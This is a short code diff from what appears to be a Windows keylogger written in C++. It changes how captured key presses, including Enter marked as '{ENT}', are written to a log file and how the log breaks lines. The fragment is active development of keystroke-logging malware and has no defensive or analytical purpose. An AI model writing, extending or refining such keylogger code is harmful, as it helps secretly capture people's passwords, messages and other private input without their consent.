@@ -66,7 +66,8 @@ KeyInfo clickedSpecialKey(std::string path, int key, std::fstream& logFile, KeyI
 	else if (key == VK_RETURN)
 	{
 		logFile << "{ENT}";
-		keyInfo.keyCount = keyInfo.keyCount + 5;
+		//keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.currentLine = keyInfo.currentLine + 1;
 		keyInfo.specialClick = true;
 		return keyInfo;
 	}
@@ -166,14 +167,14 @@ int main()
 					keyInfo.currentLine++;
 				}
 
+				keyInfo = clickedSpecialKey(path, keyPress, logFile, keyInfo);
+
 				if (keyInfo.currentLine > line)
 				{
 					logFile << "\n";
 					keyInfo.keyCount = 0;
 					line++;
 				}
-
-				keyInfo = clickedSpecialKey(path, keyPress, logFile, keyInfo);
 
 				if (keyInfo.specialClick == false)
 				{
